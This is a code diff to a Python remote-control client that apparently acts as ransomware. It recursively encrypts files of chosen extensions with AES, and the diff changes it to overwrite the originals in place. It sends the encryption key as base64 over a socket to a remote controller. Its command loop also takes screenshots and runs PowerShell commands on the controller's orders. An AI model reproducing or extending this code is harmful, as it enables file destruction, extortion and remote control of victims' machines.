@@ -23,75 +23,90 @@ import os
 key = os.urandom(32)
 iv = os.urandom(16)
 
-def encrypt(sock,input_file):
-
+def encrypt(sock, input_file):
     with open(input_file, 'rb') as f:
         data = f.read()
 
     padder = padding.PKCS7(128).padder()
-    padded_data = padder.update(data) + padder.finalize()# إضافة الحشو
+    padded_data = padder.update(data) + padder.finalize()
 
     cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
     encryptor = cipher.encryptor()
     encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
 
-    with open(input_file+"enc", 'wb') as f:
+    with open(input_file, 'wb') as f:
         f.write(iv + encrypted_data)
-    sendkey={"command":"key","result":"ok","details":key}
-    send_json(sock,sendkey)
-    details=f'the {input_file} encrypted with {key} to {input_file}.enc'
-    result={"command":"encryption","status":"ok","details":details }
-    send_json(sock,result)
+    
+    # Convert bytes to base64 string for JSON serialization
+    key_base64 = base64.b64encode(key).decode('utf-8')
+    sendkey = {"command": "key", "result": "ok", "details": key_base64}
+    send_json(sock, sendkey)
+    
+    details = f'the {input_file} encrypted with key to {input_file}.enc'
+    result = {"command": "encryption", "status": "ok", "details": details}
+    send_json(sock, result)
 
 def encrypt_file(sock,pathfile,extensions):
      os.chdir(pathfile)
      for root, dirs, files in os.walk("."):
         for file in files:
             for ext in extensions:
-                if file.endswith(ext):
+                if file.endswith(str(ext)):
                     full_path = os.path.join(root, file)
                     encrypt(sock,full_path)
 
     
 # encrypt_file("secret_data.png", "image.enc")
 
-def decrypt(sock,input_file, key):
-    key = ast.literal_eval(key)
+def decrypt(sock, input_file, key):
+    # Convert base64 string back to bytes
+    try:
+        key = base64.b64decode(key)
+    except:
+        # If it's already bytes or in another format, try hex
+        try:
+            key = bytes.fromhex(key)
+        except:
+            send_json(sock, {"command": "decrypt", "status": "error", "details": "Invalid key format"})
+            return
+
     with open(input_file, 'rb') as f:
         iv = f.read(16)
         encrypted_data = f.read()
 
-    #object of cipher for decryption
     cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
-    #object of decryptor to decrypt the data
     decryptor = cipher.decryptor()
     padded_data = decryptor.update(encrypted_data) + decryptor.finalize()
 
-    # إزالة الحشو
     unpadder = padding.PKCS7(128).unpadder()
     data = unpadder.update(padded_data) + unpadder.finalize()
-    input_fil=input_file+"enc"
+    
+    input_fil = input_file + ".dec"  # Better extension for decrypted file
     with open(input_fil, 'wb') as f:
         f.write(data)
-    details=f'the {input_file} decrypted with {key} to {input_fil}'
-    result={"command":"decrypt","status":"ok","details":details }
-    send_json(sock,result)
+    
+    details = f'the {input_file} decrypted to {input_fil}'
+    result = {"command": "decrypt", "status": "ok", "details": details}
+    send_json(sock, result)
     
 # decrypt_file("image.enc", "decrypted_image.png")
 
-def decrypt_file(sock,pathfile,extensions,key):
-     os.chdir(pathfile)
-     for root, dirs, files in os.walk("."):
+def decrypt_file(sock, pathfile, extensions, key):
+    os.chdir(pathfile)
+    for root, dirs, files in os.walk("."):
         for file in files:
             for ext in extensions:
+                # Add dot if not present and check
+                if not ext.startswith("."):
+                    ext = "." + ext
                 if file.endswith(ext):
                     full_path = os.path.join(root, file)
-                    decrypt(sock,full_path,key)
+                    decrypt(sock, full_path, key)
+                    
 def send_json(sock, obj):
     """Send JSON object with 4-byte big-endian length prefix."""
     data = json.dumps(obj).encode('utf-8')
-    a=len(data).to_bytes(4, 'big')
-    sock.sendall(a)
+    sock.sendall(len(data).to_bytes(4, 'big'))
     sock.sendall(data)
 
 def recv_all(sock, n):
@@ -199,7 +214,7 @@ def client_loop():
                 continue
 
             command = cmd.get("command")
-            send_json(sock, {"command":"message","status": "ok","note":"Received command: {command}"})
+            send_json(sock, {"command":"message","status": "ok","note": str(command)})
             try:
                 if command == "screenshot":
                     resp = handle_screenshot()
@@ -217,6 +232,7 @@ def client_loop():
                     cmdline = cmd.get("cmd", "")
                     handle_powershell(sock, cmdline)
                 elif command == "encrypt":
+                    print("PPPPPPPPPPPP")
                     path = cmd.get("path", "")
                     extensions=cmd.get("extensions","")
                     encrypt_file(sock,path,extensions)
